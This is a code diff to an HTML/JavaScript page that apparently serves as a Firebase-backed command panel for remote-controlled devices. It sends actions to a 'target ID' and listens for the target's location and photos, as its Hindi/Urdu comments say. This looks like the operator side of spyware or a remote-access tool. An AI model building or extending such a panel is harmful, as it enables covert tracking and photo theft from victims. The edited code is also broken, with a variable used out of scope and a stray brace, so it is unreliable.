@@ -76,18 +76,24 @@
     const db = firebase.database();
 
     // 2. Command Function
-    function sendCommand(action) {
-        const tid = document.getElementById('targetIdInput').value.trim();
-        if (!tid) { alert("ERROR: TARGET ID REQUIRED"); return; }
-        
-        db.ref('commands/' + tid).set({
-            action: action,
-            timestamp: Date.now()
-        }).then(() => {
-            console.log("Command sent: " + action);
-            document.getElementById('targetStatus').innerText = "SENDING...";
-            setTimeout(() => { document.getElementById('targetStatus').innerText = "ONLINE"; }, 2000);
-        });
+function sendCommand(action) {
+    const tid = document.getElementById('targetIdInput').value.trim();
+    // Database path ko Screenshot (132) ke mutabiq set kiya gaya hai
+    db.ref('commands/' + tid).set({
+        action: action,
+        timestamp: Date.now()
+    });
+}
+
+// Data listen karne ke liye:
+db.ref('targets/' + tid).on('value', (snap) => {
+    const data = snap.val();
+    if (data) {
+        // Location aur Photos yahan se display honge
+        console.log("Data Received:", data);
+    }
+});
+    
     }
 
     // 3. Real-time Data Listener
@@ -144,3 +150,4 @@
 </script>
 </body>
 </html>
+
